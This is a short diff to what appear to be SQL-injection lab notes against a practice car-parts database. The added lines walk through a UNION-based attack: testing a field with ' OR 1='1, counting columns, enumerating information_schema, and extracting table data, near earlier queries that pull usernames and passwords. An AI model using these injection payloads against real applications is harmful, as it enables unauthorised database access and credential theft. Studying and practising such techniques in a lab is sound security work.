@@ -102,11 +102,37 @@ show columns from columns ;
 select tireid,name,size from session.Tires ;
 select username,passwd from session.userinfo ;
 select carid,size,type,cost,color,year from session.car ;
+select Audi' UNION SELECT 1,2,3,4 #  ## ERROR
+select Audi' UNION SELECT 1,2,3,4,5 #
+
+## 1. Identify vulnerable field //selection
+Ford' OR 1-'1 ## Not vulnerable
+..
+..
+Audi' OR 1='1 ## Vulnerable
+
+## 2. Identify number of columns/selections
+Audi' UNION SELECT 1,2,3,4,5 #
+
+## 3. Modify Golden Statement
+Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
+
+## 4. Craft Queries
+Audi' UNION SELECT tireid,2,name,size,cost from session.Tires #
+
+
+
+
+
+
+
+
 
 ##DEFAULT DATABASES
 information_schema
 performance_schema
 mysql
+
 
 
 
